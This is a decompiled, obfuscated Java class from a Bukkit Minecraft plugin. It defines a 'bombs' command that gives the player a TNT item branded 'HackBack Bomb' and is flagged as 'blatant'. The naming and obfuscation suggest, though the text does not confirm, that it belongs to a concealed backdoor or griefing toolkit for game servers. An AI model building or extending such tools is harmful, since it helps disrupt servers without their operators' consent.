/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.ChatColor
 *  org.bukkit.Material
 *  org.bukkit.enchantments.Enchantment
 *  org.bukkit.entity.Player
 *  org.bukkit.inventory.ItemStack
 *  org.bukkit.inventory.meta.ItemMeta
 */
package me.system.runner.command.impl;

import java.util.ArrayList;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

public class BombsCommand
extends Command {
    public static final /* synthetic */ String bomb_display_name;

    static {
        bomb_display_name = String.valueOf(new StringBuilder().append((Object)ChatColor.GRAY).append("").append((Object)ChatColor.MAGIC).append("I").append((Object)ChatColor.RESET).append((Object)ChatColor.RED).append("HackBack Bomb").append((Object)ChatColor.RESET).append((Object)ChatColor.GRAY).append((Object)ChatColor.MAGIC).append("I"));
    }

    public BombsCommand() {
        BombsCommand lllllllllllllIlIlIIIllIlllIIlIII;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    @Override
    public void execute(Core lllllllllllllIlIlIIIllIllIlllIII, String lllllllllllllIlIlIIIllIllIllIlll, String[] lllllllllllllIlIlIIIllIllIllIlIl, Player lllllllllllllIlIlIIIllIllIlIlIIl) {
        lllllllllllllIlIlIIIllIllIlIlIIl.sendMessage(Settings.PREFIX("Right click to throw the bomb!"));
        ItemStack lllllllllllllIlIlIIIllIllIllIIIl = new ItemStack(Material.TNT, 1);
        ItemMeta lllllllllllllIlIlIIIllIllIlIllll = lllllllllllllIlIlIIIllIllIllIIIl.getItemMeta();
        lllllllllllllIlIlIIIllIllIlIllll.setDisplayName(String.valueOf(new StringBuilder().append((Object)ChatColor.GRAY).append("").append((Object)ChatColor.MAGIC).append("I").append((Object)ChatColor.RESET).append((Object)ChatColor.RED).append("HackBack Bomb").append((Object)ChatColor.RESET).append((Object)ChatColor.GRAY).append((Object)ChatColor.MAGIC).append("I")));
        ArrayList<String> lllllllllllllIlIlIIIllIllIlIllIl = new ArrayList<String>();
        lllllllllllllIlIlIIIllIllIlIllIl.add("Explode Me!");
        lllllllllllllIlIlIIIllIllIlIllll.addEnchant(Enchantment.DURABILITY, 1, true);
        lllllllllllllIlIlIIIllIllIlIllll.setLore(lllllllllllllIlIlIIIllIllIlIllIl);
        lllllllllllllIlIlIIIllIllIllIIIl.setItemMeta(lllllllllllllIlIlIIIllIllIlIllll);
        lllllllllllllIlIlIIIllIllIlIlIIl.getInventory().addItem(new ItemStack[]{lllllllllllllIlIlIIIllIllIllIIIl});
        String lllllllllllllIlIlIIIllIllIlIlIll = lllllllllllllIlIlIIIllIllIlIllll.getDisplayName();
    }
}

